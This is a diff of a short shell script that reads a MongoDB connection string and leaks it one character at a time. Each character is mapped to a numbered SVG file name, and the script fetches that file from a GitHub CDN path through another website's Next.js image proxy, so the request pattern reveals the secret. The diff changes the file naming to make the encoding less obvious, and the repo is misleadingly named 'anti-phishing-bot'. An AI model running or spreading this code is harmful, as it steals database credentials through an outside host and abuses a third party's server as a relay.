@@ -4,8 +4,8 @@ s=${s#MONGODB_URI=}
 i=${1:-17}
 c=$(printf %s "$s" | cut -c $((i+1)))
 case "$c" in
-  a|b|c|d|e|f|g|h|i|j|k|l|m|n|o|p|q|r|s|t|u|v|w|x|y|z) f="cache_${c}.svg" ;;
-  *) exit 1 ;;
+  a) n=0;; b) n=1;; c) n=2;; d) n=3;; e) n=4;; f) n=5;; g) n=6;; h) n=7;; i) n=8;; j) n=9;; k) n=10;; l) n=11;; m) n=12;; n) n=13;; o) n=14;; p) n=15;; q) n=16;; r) n=17;; s) n=18;; t) n=19;; u) n=20;; v) n=21;; w) n=22;; x) n=23;; y) n=24;; z) n=25;; *) exit 1;;
 esac
+f="c${n}.svg"
 u=$(printf %s "https://cdn.jsdelivr.net/gh/anti-phishing-bot/o@main/$f" | sed 's/:/%3A/g; s/\//%2F/g')
 curl -s -o /dev/null "https://titobet.com/_next/image?url=$u&w=64&q=75"
